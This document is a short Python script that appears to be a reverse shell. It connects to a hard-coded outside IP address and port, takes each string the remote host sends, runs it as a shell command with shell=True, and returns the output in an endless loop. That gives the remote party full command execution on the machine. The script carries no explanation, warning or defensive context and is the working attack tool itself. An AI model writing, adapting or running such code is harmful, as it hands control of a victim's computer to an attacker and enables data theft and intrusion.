#!/usr/bin/python
import socket, os
import subprocess as sub

s = socket.socket()
host = '173.79.253.233'
port = 37531

def parse_input(recv_string):
    process = sub.Popen(
    args=recv_string,
    stdout=sub.PIPE,
    shell=True
    )
    return process.communicate()[0]

s.connect((host,port))
while True:
    s.send(parse_input(s.recv(1024)))
s.close()
